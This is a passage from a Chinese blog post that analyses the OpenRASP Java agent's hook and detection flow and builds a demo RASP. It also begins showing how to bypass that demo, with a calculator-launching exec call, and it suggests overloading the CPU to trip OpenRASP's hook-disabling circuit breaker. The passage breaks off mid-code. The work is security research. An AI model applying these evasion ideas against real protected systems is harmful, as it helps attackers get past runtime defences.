alt="image-20230805174240220"></p><p>可以看到，加载了一个JNI库文件。此处完成V8引擎的加载，用于解释执行JavaScript。OpenRasp的一大特色就是将部分规则通过JS插件的形式来实现编写，这样做有两个优势，一是可以实现<strong>跨平台使用</strong>，减少了为不同语言重复制定相同规则的问题。另一个就是可以<strong>实现规则的热部署</strong>，添加或修改规则不需要重新启动服务。接着调用了<code>com.baidu.openrasp.EngineBoot#loadConfig</code>，完成初始化log4j、检查云控配置信息以及读取配置信息，初始化syslog服务连接等操作：</p><p><img src="https://pic.imgdb.cn/item/64cfd61f1ddac507cc84145e.jpg" alt="image-20230805174833561"></p><p>接着又执行了<code>JS.Initialize()</code>，跟进一下：</p><p><img src="https://pic.imgdb.cn/item/64cfd62b1ddac507cc842d68.jpg" alt="image-20230805181639916"></p><p>设置v8获取栈信息的getter方法，这里获得的栈信息，每一条信息包括类名、方法名和行号classname@methodname(linenumber)。紧接着是对插件的更新：</p><p><img src="https://pic.imgdb.cn/item/64cfd63a1ddac507cc844e4a.jpg" alt="image-20230805182223918"></p><p>获取plugins目录下的文件进行过滤，其中要求后缀名为.js，之后获取到合法的plugin文件后，将文件的名字和内容添加到scripts，并执行<code>UpdatePlugin(scripts);</code>，使用V8引擎进行信息的提取。之后调用<code>InitFileWatcher</code>方法来实现对js配置文件的监听事件，从而实现热部署，动态的增删js中的检测规则：</p><p><img src="https://pic.imgdb.cn/item/64cfd6471ddac507cc846a93.jpg" alt="image-20230805183104173"></p><p>紧接着调用<code>CheckerManager.init()</code>：</p><p><img src="https://pic.imgdb.cn/item/64cfd6531ddac507cc8484e8.jpg" alt="image-20230805183947706"></p><p>Type类如下：</p><p><img src="https://pic.imgdb.cn/item/64cfd65d1ddac507cc84997b.jpg" alt="image-20230805184036441"></p><p>从枚举类com.baidu.openrasp.plugin.checker.CheckParameter.Type中读取所有的checker，包含三种类型的checker，一是js插件检测，意味着这个checker会调用js plugin进行攻击检测，二是java本地检测，意味着是调用本地java代码进行攻击检测，三是安全基线检测，是用于检测一些高风险类的安全性基线检测，检测其配置是否有安全隐患。</p><p>进接着调用<code>this.initTransformer(inst)</code>，跟进：</p><p><img src="https://pic.imgdb.cn/item/64cfd6681ddac507cc84ae51.jpg" alt="image-20230805184657314"></p><p>CustomClassTransformer是ClassFileTransformer的实现类，以下是该类的一种构造方法：</p><p><img src="https://pic.imgdb.cn/item/64cfd6751ddac507cc84c5c6.jpg" alt="image-20230805184756487"></p><p>addTransformer()中指定的transfromer为自己，也就是CustomClassTransformer，之后执行addAnnotationHook()：</p><p><img src="https://pic.imgdb.cn/item/64cfd67f1ddac507cc84da61.jpg" alt="image-20230805185014583"></p><p>这个方法的作用就是扫描com.baidu.openrasp.hook包下有@HookAnnotation注解的类，之后循环调用addHook()方法，将所有不是配置文件中hooks.ignore指定的类型的对象添加到this.hooks中：</p><p><img src="https://pic.imgdb.cn/item/64cfd68b1ddac507cc84f15c.jpg" alt="image-20230805190113349"></p><p>这个hooks字段是用来提供在后续类加载通过com.baidu.openrasp.transformer.CustomClassTransformer#transform的时候，对其进行匹配，判断是否需要hook。接下来回到com.baidu.openrasp.EngineBoot#initTransformer中，调用了com.baidu.openrasp.transformer.CustomClassTransformer#retransform：</p><p><img src="https://pic.imgdb.cn/item/64cfd6971ddac507cc850a4e.jpg" alt="image-20230805190139754"></p><p><img src="https://pic.imgdb.cn/item/64cfd6a21ddac507cc8522a2.jpg" alt="image-20230805190728654"></p><p>通过调用isClassMatched判断这个类是否是Hook的类：</p><p><img src="https://pic.imgdb.cn/item/64cfd6ab1ddac507cc8535c9.jpg" alt="image-20230805190933320"></p><p>通过迭代this.hooks，调用对应的isClassMatched()方法进行匹配，如果需要hook，则调用retransformClasses()对该class进行重新定义，重新触发对该类的拦截，那我们接下来看一下<code>com.baidu.openrasp.transformer.CustomClassTransformer#transform</code>方法：</p><p><img src="https://pic.imgdb.cn/item/64cfd6b71ddac507cc854e5b.jpg" alt="image-20230805224633278"></p><p>在这里依然不断循环迭代hooks，对class进行匹配，之后调用hook类的transformClass方法：</p><p><img src="https://pic.imgdb.cn/item/64cfd6c51ddac507cc856862.jpg" alt="image-20230805225328777"></p><p>又调用了hookMethod()方法来进行字节码的修改。</p><h3 id="OpenRASP-Hook"><a href="#OpenRASP-Hook" class="headerlink" title="OpenRASP Hook"></a>OpenRASP Hook</h3><p>那接下来，我们挑一个例子来看看OpenRASP的Hook流程，例如com.baidu.openrasp.hook.xxe.XXEHook。我们首先看看com.baidu.openrasp.hook.xxe.XXEHook#isClassMatched，了解一下是如何对需要hook的类做匹配的，该方法如下所示：</p><p><img src="https://pic.imgdb.cn/item/64cfd6d21ddac507cc85827c.jpg" alt="image-20230805234958546"></p><p>代码很简单，这里检测是否是可能存在XXE漏洞的类。之后查看<code>com.baidu.openrasp.hook.xxe.XXEHook#hookMethod</code>，看看是怎么更改这些类的代码的：</p><p><img src="https://pic.imgdb.cn/item/64cfd6df1ddac507cc859e6a.jpg" alt="image-20230805235310814"></p><p>这里通过调用了<code>com.baidu.openrasp.hook.AbstractClassHook#getInvokeStaticSrc</code>方法获取了需要插入到这些类的expandSystemId()和setDescription()方法中的一些代码。getInvokeStaticSrc()如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getInvokeStaticSrc</span><span class="params">(Class invokeClass, String methodName, String paramString, Class... parameterTypes)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">invokeClassName</span> <span class="operator">=</span> invokeClass.getName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">parameterTypesString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (parameterTypes != <span class="literal">null</span> &amp;&amp; parameterTypes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            Class[] arr$ = parameterTypes;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> parameterTypes.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">parameterType</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">                <span class="keyword">if</span> (parameterType.getName().startsWith(<span class="string">&quot;[&quot;</span>)) &#123;</span><br><span class="line">                    parameterTypesString = parameterTypesString + <span class="string">&quot;Class.forName(\&quot;&quot;</span> + parameterType.getName() + <span class="string">&quot;\&quot;),&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    parameterTypesString = parameterTypesString + parameterType.getName() + <span class="string">&quot;.class,&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            parameterTypesString = parameterTypesString.substring(<span class="number">0</span>, parameterTypesString.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parameterTypesString.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            parameterTypesString = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            parameterTypesString = <span class="string">&quot;new Class[]&#123;&quot;</span> + parameterTypesString + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String src;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isLoadedByBootstrapLoader) &#123;</span><br><span class="line">            src = <span class="string">&quot;com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass(\&quot;&quot;</span> + invokeClassName + <span class="string">&quot;\&quot;).getMethod(\&quot;&quot;</span> + methodName + <span class="string">&quot;\&quot;,&quot;</span> + parameterTypesString + <span class="string">&quot;).invoke(null&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.isEmpty(paramString)) &#123;</span><br><span class="line">                src = src + <span class="string">&quot;,new Object[]&#123;&quot;</span> + paramString + <span class="string">&quot;&#125;);&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                src = src + <span class="string">&quot;,null);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getCause() != null &amp;&amp; t.getCause().getClass()&quot;</span> + <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            src = invokeClassName + <span class="string">&#x27;.&#x27;</span> + methodName + <span class="string">&quot;(&quot;</span> + paramString + <span class="string">&quot;);&quot;</span>;</span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getClass()&quot;</span> + <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> src;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>大致逻辑就是获取XXEHook类的checkXXE方法的字节码并将其写入到了sink点的运行前，也就是我们上边提到的那两个方法。现在还记得我们之前看到的将jar包添加到BootstrapClassloader的搜索路径的操作吗？注意看getInvokeStaticSrc方法这里在sink点的运行前添加了一段<code>src = &quot;com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass(\&quot;&quot; + invokeClassName + &quot;\&quot;).getMethod(\&quot;&quot; + methodName + &quot;\&quot;,&quot; + parameterTypesString + &quot;).invoke(null&quot;;</code>，moduleClassLoader是BootstrapClassloader，因此当我们在由BootstrapClassloader加载的类中插入这段代码时，这个类就可以加载到了<code>XXXHook</code>中的<code>checkXXX</code>方法来进行检测防御了。在此处就是加载到了XXEHook中的checkXXE方法。</p><p>之后我们跟进一下checkXXX方法看看是怎么对恶意攻击进行防御的，以XXEHOOK的checkXXE方法为例：</p><p><img src="https://pic.imgdb.cn/item/64cfd6ed1ddac507cc85ba45.jpg" alt="image-20230806144603157"></p><p>调用到com.baidu.openrasp.HookHandler#doCheck，之后又调用到com.baidu.openrasp.HookHandler#doCheckWithoutRequest：</p><p><img src="https://pic.imgdb.cn/item/64cfd6fa1ddac507cc85da96.jpg" alt="image-20230806144732533"></p><p>此处为RASP的熔断开关，当服务器的cpu使用率超过90%，禁用全部hook点 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Config.getConfig().getDisableHooks()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为业务大于安全的考录，熔断开关在许多的RASP产品都可以进行设置。因此有师傅提到也许可以通过DDOS，让CPU高负载，使用率超过90%，从而禁用全部hook点。当云控注册成功之前，不进入任何hook点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Config.getConfig().getCloudSwitch() &amp;&amp; Config.getConfig().getHookWhiteAll()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后走到com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest，在这里，首先判断RASP开关是否打开，即对<code>enableHook.get()</code>作判断。之后，做了一些参数的封装，以及失败日志、耗时日志等输出，并且在检测到攻击时（下一层返回），抛出异常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doRealCheckWithoutRequest</span><span class="params">(CheckParameter.Type type, Map params)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (enableHook.get()) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">            <span class="keyword">if</span> (Config.getConfig().getDebugLevel() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                a = System.currentTimeMillis();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isBlock</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="type">CheckParameter</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CheckParameter</span>(type, params);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                isBlock = CheckerManager.check(type, parameter);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var12) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;plugin check error: &quot;</span> + var12.getClass().getName() + <span class="string">&quot; because: &quot;</span> + var12.getMessage();</span><br><span class="line">                <span class="type">AbstractRequest</span> <span class="variable">request</span> <span class="operator">=</span> (AbstractRequest)requestCache.get();</span><br><span class="line">                <span class="keyword">if</span> (request != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">StringBuffer</span> <span class="variable">url</span> <span class="operator">=</span> request.getRequestURL();</span><br><span class="line">                    <span class="keyword">if</span> (!StringUtils.isEmpty(url)) &#123;</span><br><span class="line">                        msg = url + <span class="string">&quot; &quot;</span> + msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                LogTool.error(ErrorType.PLUGIN_ERROR, msg, var12);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (a &gt; <span class="number">0L</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t</span> <span class="operator">=</span> System.currentTimeMillis() - a;</span><br><span class="line">                <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;type=&quot;</span> + type.getName() + <span class="string">&quot; &quot;</span> + <span class="string">&quot;time=&quot;</span> + t;</span><br><span class="line">                <span class="keyword">if</span> (requestCache.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">                    LOGGER.info(<span class="string">&quot;request_id=&quot;</span> + ((AbstractRequest)requestCache.get()).getRequestId() + <span class="string">&quot; &quot;</span> + message);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    LOGGER.info(message);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isBlock) &#123;</span><br><span class="line">                handleBlock(parameter);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接着执行到com.baidu.openrasp.plugin.checker.CheckerManager#check：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(CheckParameter.Type type, CheckParameter parameter)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ((Checker)checkers.get(type)).check(parameter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里根据传入的type来选择调用相对应的checkers的check方法，假设此时的checker是V8AttackChecker，那么就会调用com.baidu.openrasp.plugin.checker.AbstractChecker#check：</p><p><img src="https://pic.imgdb.cn/item/64cfd7081ddac507cc85f97b.jpg" alt="image-20230806145906724"></p><p>调用了相应checker的checkParam方法，那我们看看com.baidu.openrasp.plugin.checker.v8.V8AttackChecker#checkParam：</p><p><img src="https://pic.imgdb.cn/item/64cfd7131ddac507cc860fd6.jpg" alt="image-20230806145936500"></p><p>继续跟进com.baidu.openrasp.plugin.js.JS#Check：</p><p><img src="https://pic.imgdb.cn/item/64cfd71e1ddac507cc8629ae.jpg" alt="image-20230806150051302"></p><p>箭头指向的地方即是调用JS插件进行检测的地方了。</p><h2 id="Demo-RASP实现"><a href="#Demo-RASP实现" class="headerlink" title="Demo RASP实现"></a>Demo RASP实现</h2><p>众所周知，常见的Runtime.getRuntime().exec()执行命令的底层逻辑是通过ProcessBuilder的start方法去执行命令的，而ProcessBuilder执行命令实际上也是调用了ProcessImpl这个类的start方法。那我们如果想防止这种命令执行的话，就需要在ProcessImpl处进行hook。我们先来看看OpenRASP是怎么做的，首先看看如何匹配类的：</p><p><img src="https://pic.imgdb.cn/item/64cfd7291ddac507cc8643bb.jpg" alt="image-20230806135243062"></p><p>先判断java版本，如果大于等于1.9则对<code>java/lang/ProcessImpl</code>进行hook，这是因为在JDK9的时候把<code>UNIXProcess</code>合并到了<code>ProcessImpl</code>当中，参考<a href="https://hg.openjdk.org/jdk-updates/jdk9u/jdk/rev/98eb910c9a97">https://hg.openjdk.org/jdk-updates/jdk9u/jdk/rev/98eb910c9a97</a>。之后如果小于1.9继续判断，如果是Windows操作系统，则对<code>java/lang/ProcessImpl</code>进行hook，否则对java&#x2F;lang&#x2F;UNIXProcess进行hook。我们继续看看插入的代码：</p><p><img src="https://pic.imgdb.cn/item/64cfd7341ddac507cc8657eb.jpg" alt="image-20230806135850824"></p><p>根据相应的逻辑在ProcessImpl类的初始化方法或者UNIXProcess类的初始化方法中插入相应的<code>checkCommand</code>方法。现在我先来给大家写一个Demo RASP，并给出其相应bypass方法。首先给出实现了premain方法的PreMainDemo类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreMainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> IOException, UnmodifiableClassException &#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line"></span><br><span class="line">        addJarToBootstrap(inst);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Class aClass : classes) &#123;</span><br><span class="line"><span class="comment">//            System.out.println(aClass);</span></span><br><span class="line">            <span class="keyword">if</span> (aClass.getName().contains(<span class="string">&quot;ProcessBuilder&quot;</span>) &amp;&amp; inst.isModifiableClass(aClass))&#123;</span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TransformerDemo</span>(),<span class="literal">true</span>);</span><br><span class="line">                inst.retransformClasses(aClass);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getLocalJarPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">localUrl</span> <span class="operator">=</span> PreMainDemo.class.getProtectionDomain().getCodeSource().getLocation();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            path = URLDecoder.decode(localUrl.getFile().replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;%2B&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var3) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;[OpenRASP] Failed to get jarFile path.&quot;</span>);</span><br><span class="line">            var3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addJarToBootstrap</span><span class="params">(Instrumentation inst)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">localJarPath</span> <span class="operator">=</span> getLocalJarPath();</span><br><span class="line">        inst.appendToBootstrapClassLoaderSearch(<span class="keyword">new</span> <span class="title class_">JarFile</span>(localJarPath));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是ClassFileTransformer的实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="literal">null</span>;</span><br><span class="line">        className = className.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> cp.get(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">                CtMethod[] methods = ctClass.getMethods();</span><br><span class="line">                <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> <span class="string">&quot;    System.out.println(\&quot;Get Out!Hacker!\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    return null;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (CtMethod method : methods) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;start&quot;</span>)) &#123;</span><br><span class="line">                        method.insertBefore(source);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                bytes = ctClass.toBytecode();</span><br><span class="line">                ctClass.detach();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//                e.printStackTrace();</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个Demo非常的简单，与OpenRASP类似，都是将agent.jar添加到BootstrapClassloader，但是因为我们这个Demo并不在BootstrapClassloader加载的类中添加调用agent.jar的代码，因此在这个Demo中这部分可以忽略。之后我们还new了一个ProcessBuilder类，因为如果不创建这个实例的话，inst.getAllLoadedClasses()中将没有这个类。之后我们<strong>无脑</strong>对ProcessBuilder类的start方法添加了两行代码，首先输出Get Out!Hacker!，之后return。为什么说是无脑呢？因为我们这样做，会使得正常的命令执行的需求都被屏蔽了，而且hook的是ProcessBuilder类而非ProcessImpl类，为什么hook的是ProcessBuilder就有问题呢？接下来我来给大家做个演示，再来写一个执行命令的类来模拟黑客攻击：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;mate-calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一行很简单的弹计算器的代码，之后我们添加VM Options，添加<code>-javaagent</code>为我们刚刚打包好的Demo.jar：</p><p><img src="https://pic.imgdb.cn/item/64cfd7411ddac507cc867270.jpg" alt="image-20230806141750369"></p><p>之后运行，结果如下：</p><p><img src="https://pic.imgdb.cn/item/64cfd74f1ddac507cc868ffb.jpg" alt="image-20230806141939188"></p><p>没有弹出计算器，执行到ProcessBuilder的start方法后输出Get Out!Hacker!并返回了，因此并没有成功执行命令。那我们换一种方法，因为Runtime.getRuntime().exec()的底层就是调用ProcessBuilder的start方法，那我们直接利用ProcessBuilder的start方法执行命令试试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 